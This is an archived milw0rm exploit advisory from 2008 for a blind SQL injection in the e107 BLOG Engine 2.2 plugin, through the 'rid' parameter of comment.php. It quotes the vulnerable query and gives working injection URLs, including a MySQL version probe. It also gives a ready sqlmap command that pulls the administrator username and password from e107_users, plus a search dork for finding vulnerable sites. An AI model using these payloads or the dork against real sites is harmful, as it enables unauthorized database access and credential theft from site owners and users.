<html><head><title>e107 Plugin BLOG Engine 2.2 (rid) Blind SQL Injection Vulnerability</title></head><pre>[+] Author: Saime
[+] Script: e107 Plugin BLOG Engine v2.2 (rid) Blind SQL Injection
[+] URL: http://e107coders.org/download.php?view.1843
[+] Date: 13/05/2008
[+] Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed,GM,str0ke, and everyone else I forgot!
[+] Site: http://h4ck-y0u.org

[+] Vuln File: comment.php
[+] Line: 22-24
$rid = $_GET['rid'];
//blog entry echo
$sql -&gt; db_Query(&quot;select &quot;.MPREFIX.&quot;macgurublog_rec.*, blog_enable from &quot;.MPREFIX.&quot;macgurublog_rec left join &quot;.MPREFIX.&quot;macgurublog_main on (&quot;.MPREFIX.&quot;macgurublog_rec.blogrec_uid=&quot;.MPREFIX.&quot;macgurublog_main.blog_uid) where blogrec_id=&quot;.$rid.&quot;;&quot;);
[+] Exploit:
http://site.com/e107_plugins/macgurublog_menu/comment.php?rid=1 and 1=1-- // returns no errors
http://site.com/e107_plugins/macgurublog_menu/comment.php?rid=1 and 1=2-- // returns error about unknown entry
http://site.com/e107_plugins/macgurublog_menu/comment.php?rid=1 and substring(@@version,1,1)=4 // check the mysql version. if 4 returns error, try 5.
Since e107 uses diffrent table names it's almost impossible to write exploit for it. So I am suggesting to use sqlmap to use this vulnerabilty.
The command like should look like this:
./sqlmap.py -u &quot;URL&quot; -p rid -a &quot;./txt/user-agents.txt&quot; -v1 --string &quot;string which proofs the query is valid&quot; -e &quot;sql query&quot;
Example:
./sqlmap.py -u &quot;http://site.com/e107_plugins/macgurublog_menu/comment.php?rid=1&quot; -p rid -a &quot;./txt/user-agents.txt&quot; -v1 --string &quot;Saime&quot; -e &quot;&lt;SELECT concat(username,0x3a,password) from e107_users where userid=1 limit 0,1&gt;&quot;
[+] Dork: inurl:/macgurublog_menu/
[+] Notes: Not to Turkish Warrior, good job on leaking CipherCrew exploits and submiting them as your own dumbass! ;)

# milw0rm.com [2008-05-13]</pre></html>